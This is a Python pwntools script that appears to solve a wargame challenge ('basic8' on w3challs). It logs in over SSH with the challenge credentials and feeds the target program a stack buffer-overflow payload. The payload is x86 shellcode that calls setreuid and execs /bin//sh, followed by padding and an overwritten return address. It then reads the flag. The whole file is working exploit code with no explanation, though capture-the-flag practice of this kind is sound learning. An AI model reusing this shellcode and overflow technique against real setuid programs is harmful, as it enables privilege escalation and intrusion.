#!/usr/bin/python

from pwn import *

shellcode = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"

payload = shellcode + "A" * 222 + "\x0f\xdb\xea\x0d"

def exploit():
    global payload
    io = ssh(host="wargame.w3challs.com", user="basic8", password="basic8", port=10101)
    sh = io.run("/home/basic8/basic8 {}".format(payload))
    sh.sendline("cat flag")
    log.success(sh.recvline())
    io.close()

def main():
    exploit()

if __name__=="__main__":
    main()
